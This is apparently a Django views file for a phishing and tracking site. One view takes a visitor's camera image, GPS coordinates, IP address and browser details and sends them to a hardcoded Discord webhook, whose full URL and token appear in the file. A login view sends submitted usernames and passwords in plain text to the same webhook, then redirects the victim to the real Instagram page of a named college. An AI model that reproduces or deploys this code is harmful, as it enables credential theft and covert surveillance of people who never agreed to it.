import base64
import os
import json
import requests
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
from django.shortcuts import render, redirect

# Replace with your actual Discord webhook URL
DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1314953496893718548/MegFozni54EOOEzjyYFWngizgo-cLk-MuOlMjdsb9jra4g1uZyIRV7A2J2NtCKO5mpUn'

@csrf_exempt
def upload_image(request):
    """
    Handles image uploads, metadata (location), and sends them to a Discord webhook.
    """
    if request.method == 'POST':
        try:
            # Parse incoming JSON payload
            data = json.loads(request.body)
            latitude = data.get('latitude')
            longitude = data.get('longitude')
            location_url = data.get('locationUrl')
            image_data = data.get('image', '').split(',')[1] if 'image' in data and ',' in data.get('image', '') else None

            # Temporary storage for image if available
            image_path = None
            if image_data:
                image_bytes = base64.b64decode(image_data)
                image_path = 'temp_image.png'
                with open(image_path, 'wb') as image_file:
                    image_file.write(image_bytes)

            # Collect IP and User-Agent information
            ip_address = get_client_ip(request)
            user_agent = request.META.get('HTTP_USER_AGENT', 'Unknown')

            # Prepare Discord payload
            content_message = (
                f"New upload received:\n"
                f"IP Address: {ip_address}\n"
                f"User-Agent: {user_agent}\n"
                f"Latitude: {latitude}\n"
                f"Longitude: {longitude}\n"
                f"Location URL: {location_url}"
            )

            # Send to Discord webhook
            files = {'file': open(image_path, 'rb')} if image_path else None
            response = requests.post(
                DISCORD_WEBHOOK_URL,
                files=files,
                data={'content': content_message}
            )

            # Clean up temporary image file
            if image_path and os.path.exists(image_path):
                os.remove(image_path)

            # Return success or failure response
            if response.status_code == 204:
                return JsonResponse({'message': 'Data sent to Discord successfully!'})
            else:
                return JsonResponse({'message': f'Failed to send data to Discord. Response: {response.text}'}, status=500)
        except Exception as e:
            return JsonResponse({'message': f'Error: {str(e)}'}, status=500)
    return JsonResponse({'message': 'Invalid request method.'}, status=400)

def get_client_ip(request):
    """
    Retrieve the client's IP address from the request object.
    """
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]
    else:
        ip = request.META.get('REMOTE_ADDR', 'Unknown')
    return ip

def index(request):
    """
    Render the main index page.
    """
    return render(request, 'capture/index.html')

def login_view(request):
    """
    Handles login attempts and logs credentials to a Discord webhook.
    """
    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password')

        # Log credentials to Discord
        payload = {"content": f"Login attempt:\nUsername: {username}\nPassword: {password}"}
        requests.post(DISCORD_WEBHOOK_URL, data=payload)

        # Redirect to the official Instagram page
        return redirect('https://www.instagram.com/ishaqiyya_college_muttumthala')  # Replace with actual URL
    return render(request, 'login.html')
